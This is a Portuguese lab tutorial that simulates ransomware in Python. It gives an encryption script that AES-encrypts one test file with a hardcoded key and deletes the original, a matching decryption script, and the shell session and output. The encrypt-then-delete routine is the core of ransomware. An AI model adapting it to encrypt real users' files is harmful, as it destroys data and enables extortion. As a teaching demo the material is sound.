## Entendendo um Ransomware na prática com Python

**Ferramentas:**

- Ubuntu Linux
- Python 3

1. Crie um diretório para trabalhar em um ambiente controlado:

``` 
~/workspace$ mkdir encript-decript
~/workspace$ ls
```
> encript-decript

```
~/workspace$ cd encript-decript
```

2. Criando os arquivos:

```
~/workspace/encript-decript$ echo "Arquivo de texto não encriptado" > teste.txt
~/workspace/encript-decript$ nano encript.py
```

> código do arquivo encript.py:

```
import os
import pyaes

# Script para simular um Ransomware

# Função principal para encriptar o arquivo de teste.txt
# Inclui no laboratório um tratamento de erro try-except, mas em um cenário real não estariam
def encrypt_file(input_filename, output_filename, key):
    try:
        with open(input_filename, "rb") as original_file:
            aes = pyaes.AESModeOfOperationCTR(key)
            with open(output_filename, "wb") as encrypted_file:
                while True:
                    chunk = original_file.read(1024)  # Lê o arquivo em blocos de 1 KB
                    if not chunk:
                        break
                    encrypted_chunk = aes.encrypt(chunk)
                    encrypted_file.write(encrypted_chunk)
        
        # Remover o arquivo original após a criptografia bem-sucedida
        os.remove(input_filename)
        
        print(f"Arquivo '{input_filename}' criptografado com sucesso em '{output_filename}'")
    
    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {str(e)}")

# Como é um laboratório, inclui a estrutura if __name__=="__main__"
# Dessa forma o código só será executado diretamente.

if __name__ == "__main__":
    original_file_name = "teste.txt"
    encrypted_file_name = original_file_name + ".ransomwaretroll"
    encryption_key = b"testeransomwares"

    encrypt_file(original_file_name, encrypted_file_name, encryption_key) # chamada da função aqui
```
>
```
~/workspace/encript-decript$ nano decript.py
```

> código do arquivo decript.py:

```
import os
import pyaes

# Script para simular o resgate de um arquivo encriptado por um Ransomware

# Função principal para descriptografar o arquivo de teste.txt
# Inclui no laboratório um tratamento de erro try-except, mas em um cenário real não estariam

def decrypt_file(input_filename, output_filename, key):
    try:
        with open(input_filename, "rb") as encrypted_file:
            aes = pyaes.AESModeOfOperationCTR(key)
            with open(output_filename, "wb") as decrypted_file:
                while True:
                    chunk = encrypted_file.read(1024)  # Lê o arquivo criptografado em blocos de 1 KB
                    if not chunk:
                        break
                    decrypted_chunk = aes.decrypt(chunk)
                    decrypted_file.write(decrypted_chunk)
        
        # Remover o arquivo criptografado após a descriptografia bem-sucedida
        os.remove(input_filename)
        
        print(f"Arquivo '{input_filename}' descriptografado com sucesso em '{output_filename}'")
    
    except Exception as e:
        print(f"Erro ao descriptografar o arquivo: {str(e)}")

# Como é um laboratório, inclui a estrutura if __name__=="__main__"
# Dessa forma o código só será executado diretamente.

if __name__ == "__main__":
    encrypted_file_name = "teste.txt.ransomwaretroll"
    decrypted_file_name = "teste.txt"
    decryption_key = b"testeransomwares"

    decrypt_file(encrypted_file_name, decrypted_file_name, decryption_key) # chamada da função aqui
```

3. Instalando bibilioteca **pyaes**:

```
~/workspace/encript-decript$ pip install pyaes
```
> Saída:

```
Defaulting to user installation because normal site-packages is not writeable
Collecting pyaes
  Downloading pyaes-1.6.1.tar.gz (28 kB)
  Preparing metadata (setup.py) ... done
Building wheels for collected packages: pyaes
  Building wheel for pyaes (setup.py) ... done
  Created wheel for pyaes: filename=pyaes-1.6.1-py3-none-any.whl size=26363 sha256=4abc28ef17fd9d7040d63936f1c746ab30653a3c0b62c643b69bc5cc6308f0f6
  Stored in directory: /home/meuUsuario/.cache/pip/wheels/d6/84/5f/ea6aef85a93c7e1922486369874f4740a5642d261e09c59140
Successfully built pyaes
Installing collected packages: pyaes
Successfully installed pyaes-1.6.1
```

4. Executando os scripts:

``` 
~/workspace/encript-decript$ ls
```
> Saída:
```
decript.py  encript.py  teste.txt
```
>
```
~/workspace/encript-decript$ python3 encript.py
```
> Saída:
```
Arquivo 'teste.txt' criptografado com sucesso em 'teste.txt.ransomwaretroll'
```
>
```
~/workspace/encript-decript$ ls
```
> Saída:
```
decript.py  encript.py  teste.txt.ransomwaretroll
```
>
```
~/workspace/encript-decript$ cat teste.txt.ransomwaretroll 
```
> Saída:
```
i�'|&`,N�x.Pw���/��,��i��
```
>
```
~/workspace/encript-decript$ python3 decript.py
```
> Saída:
```
Arquivo 'teste.txt.ransomwaretroll' descriptografado com sucesso em 'teste.txt'
```
>
```
~/workspace/encript-decript$ ls
```
> Saída:
```
decript.py  encript.py  teste.txt
```